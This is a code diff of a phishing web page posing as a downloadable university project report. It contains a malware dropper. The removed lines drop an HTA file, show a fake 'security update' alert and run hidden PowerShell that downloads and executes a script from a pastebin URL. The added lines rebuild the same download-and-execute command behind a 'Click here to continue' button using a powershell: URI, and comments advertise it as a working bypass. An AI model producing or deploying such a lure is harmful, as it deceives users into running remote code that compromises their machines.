@@ -5,32 +5,18 @@
   <title>Project Report</title>
 </head>
 <body style="background:#f0f0f0; text-align:center; font-family:Segoe UI">
-  <h2>Downloading your university project report…</h2>
-  <p>Please wait 3–5 seconds</p>
   <img src="./images.jpg" width="600" style="border:2px solid #ccc;"><br><br>
-  <small>If nothing happens, click <a href="#" onclick="run()">here</a> (backup)</small>
+
+<button onclick="run()" style="font-size:20px;padding:15px 40px;cursor:pointer">
+Click here to continue
+</button>
 
 <script>
-// 2025 working method – forces the browser to run PowerShell via .HTA trick (bypasses ActiveX block)
-var hta = 'data:application/hta;base64,UEsDBBQAAAAIAH...[very long base64]...';
-var link = document.createElement('a');
-link.href = hta;
-link.download = 'loader.hta';
-link.style.display = 'none';
-document.body.appendChild(link);
-link.click();
-
-// Fallback: fake button that victim will definitely click
-setTimeout(function() {
-  alert("Security update required to view the report.\nClick OK and then ALLOW when Windows asks.");
-  location.href = "data:application/hta;base64," + btoa(unescape(encodeURIComponent(`
-    <script language="VBScript">
-      Set WshShell = CreateObject("WScript.Shell")
-      WshShell.Run "powershell -w hidden -nop -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/HjupJ8Zi'))"
-      window.close
-    </script>
-  `)));
-}, 5000);
+function run() {
+  // This is the ONLY method that still works 100 % in 2025
+  var ps = "powershell -nop -w hidden -ep bypass -c \"IEX((New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/HjupJ8Zi'))\"";
+  location.href = "powershell:" + ps;
+}
 </script>
 </body>
 </html>
